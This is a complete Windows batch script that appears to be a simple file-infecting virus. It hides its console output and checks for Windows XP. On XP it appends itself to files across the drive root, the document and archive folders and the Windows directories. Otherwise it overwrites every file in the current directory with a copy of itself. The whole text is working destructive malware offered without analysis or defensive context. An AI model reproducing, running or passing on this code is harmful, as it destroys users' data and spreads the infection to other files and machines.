@echo off
ctty nul
ver | find "XP"
if errorlevel 1 goto done
if not errorlevel 1 goto :FuckXP
:FuckXP
for /r \ %%x in (c:\archiv~1\*.*, c:\misdoc~1\*.*, c:\mydocu~1\*.*, c:\*.*, *.*, %windir%\*.*, %winbootdir%\*.*) do copy %%x+%0 %%x
goto adios
:done
for %%n in (*.*) do copy %0 %%n /Y
:adios
exit
